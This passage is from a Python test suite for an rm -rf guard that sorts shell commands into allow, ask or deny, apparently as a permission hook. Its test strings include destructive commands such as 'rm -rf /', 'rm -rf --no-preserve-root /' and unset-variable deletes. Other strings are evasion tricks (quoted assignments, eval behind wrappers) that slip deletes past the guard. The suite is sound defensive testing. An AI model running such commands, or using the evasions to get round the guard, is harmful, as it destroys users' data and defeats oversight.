     'W=/tmp/b; {fd}<in typeset -g "$(printf X)=/"; rm -rf "$W"/*', "ask"),
    ("...and a harmless command behind one still clears",
     'W=/tmp/b; {fd}>out echo hi; rm -rf "$W"/*', "allow"),
    # A closer that IS a command word but closes nothing. `end` in a bash
    # for-body is command-not-found, the loop keeps running, and popping on it
    # re-permitted the ordering the loop rule exists to void. Closers are
    # matched by kind now: done for for/select/while/until/repeat, end for
    # foreach.
    ("`end` does not close a `for`",
     'W=/tmp/b; for i in 1 2; do rm -rf "$W"/*; end; typeset -g "$(printf X)=/"; done',
     "ask"),
    ("`done` does not close a `foreach`",
     'W=/tmp/b\nforeach i (1 2)\nrm -rf "$W"/*\ndone\ntypeset -g "$(printf X)=/"\nend',
     "ask"),
    # ...and the matched closers must still pop, or every loop stays open for
    # the rest of the line and nothing after one ever clears. These were the
    # rows the closer rule lacked entirely: it could be deleted outright with
    # the suite green.
    ("a matched `done` closes its loop",
     'W=/tmp/b; for f in a b; do echo "$f"; done; rm -rf "$W"/*; declare -g "$(printf X)=/"',
     "allow"),
    ("a matched `end` closes its foreach",
     'W=/tmp/b\nforeach f (a b)\necho $f\nend\nrm -rf "$W"/*\ndeclare -g "$(printf X)=/"',
     "allow"),
]


# (command, the bindings it proves)
#
# Unit-level rather than driven through the CLI, because a binding changes no
# verdict on its own -- it changes what classify_operand is able to resolve, and
# pinning the map directly is what localises a failure to the scanner instead of
# to the classifier downstream of it.
BINDING_CASES = [
    # --- proven --------------------------------------------------------------
    ('W=/tmp/build; rm -rf "$W"/*', {"W": "/tmp/build"}),
    # Tokenized identically to the env-prefix form below until mask_opaque began
    # normalising unquoted newlines to ";".
    ('W=/tmp/build\nrm -rf "$W"/*', {"W": "/tmp/build"}),
    ('W=/tmp/build && rm -rf "$W"/*', {"W": "/tmp/build"}),
    ('A=/tmp; B=x; rm -rf "$A/$B"/*', {"A": "/tmp", "B": "x"}),
    # Last wins, exactly as the shell does.
    ('W=/tmp/x; W=/; rm -rf "$W"/*', {"W": "/"}),
    # A plain read does not disqualify. This is the permissive edge of the
    # other-mention rule and it is deliberate: the alternative is deciding which
    # commands are read-only, which is the reasoning this guard refuses to do.
    ('W=/tmp/x; echo "$W"; rm -rf "$W"/*', {"W": "/tmp/x"}),
    # ...and the control: a different name, so no vouching is possible and the
    # real assignment still proves itself.
    ("X=/tmp/other; 'W=/tmp/evil'; rm -rf \"$W\"/*", {"X": "/tmp/other"}),

    # --- not proven ----------------------------------------------------------
    # An env prefix is expanded from the OUTER scope before the assignment
    # applies, so it proves nothing. One segment, not two.
    ('W=/tmp/x rm -rf "$W"/*', {}),
    ('export W=/tmp/x; rm -rf "$W"/*', {}),
    # The run must start at the first segment: proving `echo hi` cannot touch W
    # means reasoning about arbitrary commands.
    ('echo hi; W=/tmp/x; rm -rf "$W"/*', {}),
    # A pipeline segment runs in a subshell, so the assignment never escapes.
    ('W=/tmp/x | cat; rm -rf "$W"/*', {}),
    # ...and `||` runs what follows only if the assignment FAILED.
    ('W=/tmp/x || rm -rf "$W"/*', {}),
    # The leading-run rule requires the FIRST segment to be a lone assignment;
    # under BINDING_RE that means matching at position 0, and `if x` fails
    # that match immediately because `if` is not followed by `=`. The run
    # never starts, so `then W=/tmp/x` is never looked at, let alone parsed.
    ('if x; then W=/tmp/x; fi; rm -rf "$W"/*', {}),
    ('W=$HOME; rm -rf "$W"/*', {}),
    ('W=$(pwd); rm -rf "$W"/*', {}),
    ('W=`pwd`; rm -rf "$W"/*', {}),
    # Every rebinding path names the variable, which is the whole rule.
    ('W=/tmp/x; unset W; rm -rf "$W"/*', {}),
    ('W=/tmp/x; W=$1; rm -rf "$W"/*', {}),
    ('W=/tmp/x; for W in a b; do echo $W; done', {}),
    ('W=/tmp/x; rm -rf "${W:-/}"/*', {}),
    # The deny list is absolute: a same-line reassignment does not unlock it.
    ('HOME=/tmp/fake; rm -rf "$HOME"', {}),
    # mask_opaque reduced the body to one sentinel token, so a heredoc can never
    # supply a binding -- no leading-run rule needed to exclude it.
    ("cat <<'EOF' > /tmp/f\nW=/tmp/safe\nEOF\nrm -rf \"$W\"/*", {}),
    # shlex performs quote removal, so 'W=/tmp/build', "W=/tmp/build",
    # "W"=/tmp/build, and 'W'=/tmp/build all arrive here as the identical token
    # W=/tmp/build. Bash decides assignment-ness BEFORE quote removal, though,
    # and in all four of these the name or the `=` is quoted, which makes the
    # word a COMMAND, not an assignment. That command's lookup fails (no such
    # file or directory) and W is never set -- so `rm -rf "$W"/*` runs against
    # an empty W, i.e. `rm -rf /*`. Confirmed against bash.
    ("'W=/tmp/build'; rm -rf \"$W\"/*", {}),
    ('"W=/tmp/build"; rm -rf "$W"/*', {}),
    ('"W"=/tmp/build; rm -rf "$W"/*', {}),
    ("'W'=/tmp/build; rm -rf \"$W\"/*", {}),
    # An earlier genuine assignment must not vouch for a later quoted one. bash
    # leaves W at /tmp/ok here: the quoted word is a command whose lookup fails.
    ("W=/; 'W=/tmp/build'; rm -rf \"$W\"/*", {}),
    ("W=/tmp/ok; 'W=/tmp/evil'; rm -rf \"$W\"/*", {}),

    # Every one of these IS a real assignment -- bash sets W (or A) to exactly
    # the literal shlex would hand back. What disqualifies each is that the
    # VALUE needed a quote or a backslash to survive: BINDING_RE's charset
    # excludes every character that would, on purpose, because that is exactly
    # the set on which a second reading of the source could disagree with
    # shlex's -- which is what the two-parser design did, and each of its three
    # Critical findings was one such disagreement. A single reading cannot
    # vouch for a value it cannot read, so this costs a prompt rather than a
    # wrong allow.
    ('W="/tmp/my build"; rm -rf "$W"/*', {}),
    ("W='/tmp/build'; rm -rf \"$W\"/*", {}),
    ('W=/tmp/"build"; rm -rf "$W"/*', {}),
    ("W=/tmp/my\\ build; rm -rf \"$W\"/*", {}),
    ("A=x\\;W=/tmp/ok; 'W=/tmp/evil'; rm -rf \"$W\"/*", {}),
    ("A=x\\;B=1; 'W=/tmp/evil'; rm -rf \"$W\"/*", {}),

    # eval/source/. rebind without ever writing the variable's name in this
    # command's text -- the name lives in $C or in the sourced file, both
    # invisible to a mention scan. `command`/`builtin` change nothing about
    # that; they are here because analyse()'s OWN command-position bail-out
    # misses `eval` behind either wrapper, so proven_bindings cannot lean on
    # that check catching these first and must refuse them itself.
    ('W=/tmp/x; eval "$C"; rm -rf "$W"/*', {}),
    ('W=/tmp/x; command eval "$C"; rm -rf "$W"/*', {}),
    ('W=/tmp/x; builtin eval "$C"; rm -rf "$W"/*', {}),
    ('W=/tmp/x; . ./setenv; rm -rf "$W"/*', {}),
    # bash tilde-expands an assignment's RHS at its start and after every
    # unquoted `:`, so `~` in the value is not the literal character it looks
    # like -- W ends up $HOME, not the one-character string "~".
    ('W=~; rm -rf "$W"/x', {}),
    ('W=/a:~/b; rm -rf "$W"/x', {}),
    # $((W=1)) is arithmetic that assigns W, masked by mask_opaque to a
    # sentinel so shlex is not shattered by it -- but the mention scan must
    # read the UNMASKED text back in, or the rebinding is invisible behind
    # its own placeholder.
    ('W=/tmp/x; echo $((W=1)); rm -rf "$W"/*', {}),
    # The old check split the RAW remainder and tested each word verbatim, so
    # quoting or escaping the word walked straight past it -- the raw text
    # never spells "eval" in most of these; a shlex reading is what actually
    # sees it. The last two evade analyse()'s own command-position bail as
    # well: a wrapper hides the word from that check, and `builtin` was never
    # even in WRAPPERS.
    ('W=/tmp/x; \\eval "$C"; rm -rf "$W"/*', {}),
    ('W=/tmp/x; "eval" "$C"; rm -rf "$W"/*', {}),
    ('W=/tmp/x; eval$IFS"$C"; rm -rf "$W"/*', {}),
    ('W=/tmp/build; command \\eval "$C"; rm -rf "$W"/*', {}),
    ('W=/tmp/build; builtin "eval" "$C"; rm -rf "$W"/*', {}),
    # xargs cannot rebind the parent shell at all, unlike the other three --
    # this documents that the refusal covers the whole shared OPAQUE set, not
    # only the members that can actually rebind.
    ('W=/tmp/x; xargs -0 ls; rm -rf "$W"/*', {}),
]


def check_bindings():
    """proven_bindings() in isolation. Nothing here is executed -- see module doc."""
    fails = []
    for cmd, want in BINDING_CASES:
        got = proven_bindings(cmd)
        if got != want:
            fails.append(("bindings", cmd, want, got, ""))
    return fails


def check_wrapper():
    """rm-guard.sh must relay the guard's verdict, and must never fail silent.

    A guard that quietly does nothing is worse than no guard, because you stop
    looking for one -- that is the whole reason the wrapper exists.
    """
    fails = []

    def want(name, got, expected):
        if got != expected:
            fails.append((name, "", expected, got, ""))

    d, _ = run(["bash", WRAPPER], 'git commit -m "chore: clean up rm -rf handling"')
    want("wrapper: relays a passthrough", d, "pass")

    d, reason = run(["bash", WRAPPER], "rm -rf /etc/x")
    want("wrapper: relays a verdict", d, "ask")
    if "\x1b[" not in reason:
        fails.append(("wrapper: verdict keeps its highlighting", "", "SGR sequences",
                      "none", reason[:120]))

    # Guard unreachable: the degraded path must still emit valid JSON that asks.
    tmp = tempfile.mkdtemp()
    try:
        shutil.copy(WRAPPER, tmp)  # deliberately WITHOUT rm_guard.py beside it
        d, reason = run(["bash", os.path.join(tmp, os.path.basename(WRAPPER))],
                        "rm -rf /etc/x")
        want("wrapper: degraded path still asks", d, "ask")
        if "could not run" not in reason:
            fails.append(("wrapper: degraded path names the failure", "", "could not run",
                          d, reason[:120]))
    finally:
        shutil.rmtree(tmp, ignore_errors=True)
    return fails


RENDER_CHECKS = 17


def check_render():
    """The three colour roles must survive into the reason, on the right spans.

    Verdicts alone would pass with every escape stripped out. What makes the
    prompt readable at a glance is that the parts fail differently and look
    different: `rm -rf` is what destroys, `/build` is a path you can read, and
    `$(pwd)` is the part whose value nothing here can know.
    """
    fails = []
    _, reason = verdict('rm -rf "$(pwd)/build"')
    for what, want in (
            ("command is red", "\x1b[1;31mrm\x1b[0m"),
            ("substitution is magenta", "\x1b[1;35m$(pwd)\x1b[0m"),
            ("literal suffix stays yellow", "\x1b[1;33m/build\x1b[0m"),
            ("operand row repeats the split",
             "\x1b[1;35m$(pwd)\x1b[0m\x1b[1;33m/build\x1b[0m  command substitution"),
    ):
        if want not in reason:
            fails.append((f"render: {what}", 'rm -rf "$(pwd)/build"',
                          want.replace("\x1b", "\\e"), "absent",
                          reason.replace("\x1b", "\\e")))

    # A bail-out echoes its segment like every other verdict, and the arguments
    # are the point of it: naming `xargs` says which word stopped the guard and
    # nothing about what xargs was told to do. So the construct comes back red,
    # everything it hides comes back yellow, and the sentence below marks the
    # construct again to key the two together. Markers never survive into text.
    for what, cmd, want in (
            ("opaque construct is red", "ls | xargs rm -rf /etc",
             "\x1b[1;31mxargs\x1b[0m"),
            ("...and its hidden arguments are all lit", "ls | xargs rm -rf /etc",
             "\x1b[1;31mxargs\x1b[0m \x1b[1;33mrm\x1b[0m "
             "\x1b[1;33m-rf\x1b[0m \x1b[1;33m/etc\x1b[0m"),
            ("bail-out flag is red", "rm -rf --no-preserve-root /",
             "\x1b[1;31m--no-preserve-root\x1b[0m"),
            ("...and the flag and its target are lit, not the rest of the rm",
             "rm -rf --no-preserve-root /",
             "\x1b[1;31mrm\x1b[0m \x1b[1;31m-rf\x1b[0m "
             "\x1b[1;33m--no-preserve-root\x1b[0m \x1b[1;33m/\x1b[0m"),
            # Named rather than described, so you can see it is a string awk
            # prints and not a command anything runs.
            ("unparsed rm names the fragment", 'awk \'{print "rm -rf /"}\'',
             "\x1b[1;31mrm -rf\x1b[0m"),
            ("...and lights the token it is buried in", 'awk \'{print "rm -rf /"}\'',
             '\x1b[1;31mawk\x1b[0m \x1b[1;33m{print "rm -rf /"}\x1b[0m'),
            # A marked span renders as it would inside an echoed command, so a
            # substitution keeps the colour that means "value unknowable".
            ("marked substitution stays magenta", "`echo rm` -rf /",
             "\x1b[1;35m`echo rm`\x1b[0m"),
            ("...in the echo as well as the sentence", "`echo rm` -rf /",
             "\x1b[1;35m`echo rm`\x1b[0m \x1b[1;33m-rf\x1b[0m \x1b[1;33m/\x1b[0m"),

            # The split this guard exists for. `$W`/* is the exact command that
            # wiped the machine, and one flat colour over it says only "this
            # operand", when the point is that the two halves fail differently:
            # $W is unknowable and /* is what turns empty into /.
            ("unguarded expansion splits from its suffix", 'rm -rf "$W"/*',
             "\x1b[1;35m$W\x1b[0m\x1b[1;33m/*\x1b[0m"),
            # ...and the restriction that keeps that honest. $HOME is flagged
            # for what the guard KNOWS it is, so it must not be dimmed to
            # "cannot know" -- it stays one yellow operand.
            ("a whole-token expansion is not split", 'rm -rf "$HOME"',
             "\x1b[1;33m$HOME\x1b[0m"),
            # The guarded form is the fix, and painting the fix like the fault
            # undercuts it -- it stays plain between two painted neighbours.
            ("a ${VAR:?}-guarded operand is left alone", 'rm -rf "${W:?}"/* /etc/y',
             "\x1b[0m ${W:?}/* \x1b[1;33m"),
            # The one span in the verdict that is not a complaint.
            ("the fix is cyan", 'rm -rf "$W"/*', '\x1b[1;36m"${W:?}"\x1b[0m'),
            # A deny and an ask are otherwise told apart by wording alone.
            ("only the deny headline is painted", "rm -rf /",
             "\x1b[1;31mrefusing catastrophic delete\x1b[0m"),
    ):
        _, reason = verdict(cmd)
        if want not in reason or MARK in reason:
            fails.append((f"render: {what}", cmd, want.replace("\x1b", "\\e"),
                          "absent" if want not in reason else "markers left in",
                          reason.replace("\x1b", "\\e")))
    return fails
def main():
    fails = []
    for name, cmd, expected in CASES:
        got, reason = verdict(cmd)
        if got != expected:
            fails.append((name, cmd, expected, got, reason))
    fails += check_wrapper()
    fails += check_render()
    fails += check_bindings()

    for name, cmd, expected, got, reason in fails:
        first = reason.replace("\x1b", "\\e").splitlines()[0][:160] if reason else ""
        print(f"FAIL {name}")
        if cmd:
            print(f"  cmd:  {cmd!r}")
        print(f"  want: {expected}   got: {got}")
        if first:
            print(f"  why:  {first}")
        print()

    total = len(CASES) + 5 + RENDER_CHECKS + len(BINDING_CASES)
    print(f"{total - len(fails)}/{total} passed")
    return 1 if fails else 0


if __name__ == "__main__":
    sys.exit(main())
